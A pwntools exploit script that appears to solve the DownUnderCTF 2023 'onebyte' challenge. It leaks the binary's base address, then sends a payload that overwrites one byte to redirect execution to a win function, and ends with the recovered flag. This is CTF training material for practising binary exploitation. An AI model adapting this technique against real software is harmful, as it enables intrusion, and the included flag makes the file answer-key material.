#!/usr/bin/python3

from pwn import *

exe = ELF('onebyte', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+93

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('2023.ductf.dev',30018)
else:
        p = process(exe.path)

GDB()
p.recvuntil(b'Free junk: ')
exe.address = int(p.recvline(keepends = False), 16) - (exe.sym.init)
info(hex(exe.address))
sa(b'turn: ', p32(exe.sym.win) * 4 + p8(0x98+8))
p.interactive()
# DUCTF{all_1t_t4k3s_is_0n3!}